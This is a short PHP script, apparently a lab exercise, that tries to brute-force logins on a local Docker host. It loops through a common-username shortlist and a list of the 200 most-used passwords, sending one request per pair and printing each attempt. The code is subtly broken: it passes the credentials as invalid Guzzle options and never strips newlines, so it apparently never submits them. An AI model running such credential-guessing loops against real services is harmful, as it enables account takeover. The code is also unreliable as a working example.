<?php

use GuzzleHttp\Client as Guzzle;

require_once __DIR__ . '/../vendor/autoload.php';

$client = new Guzzle(['base_uri' => 'http://host.docker.internal:80']);

$usernames = fopen('top-usernames-shortlist.txt', 'r');
while(!feof($usernames)) {
    $username = fgets($usernames);

    $passwords = fopen('2020-200_most_used_passwords.txt', 'r');
    while(!feof($passwords)) {
        $password = fgets($passwords);
        echo 'DEBUG => username: ' . $username . ' - password: ' . $password;
        $response = $client->request('GET', '/', [
            'username' => $username,
            'password' => $password
        ]);
        echo "status: {$response->getStatusCode()} <br>";
    }
    fclose($passwords);
}
fclose($usernames);

$memory_used = memory_get_usage();
$memory_used_mb = round($memory_used / (1024 * 1024), 2);
echo "Total memory used: " . $memory_used_mb . "MB\n";


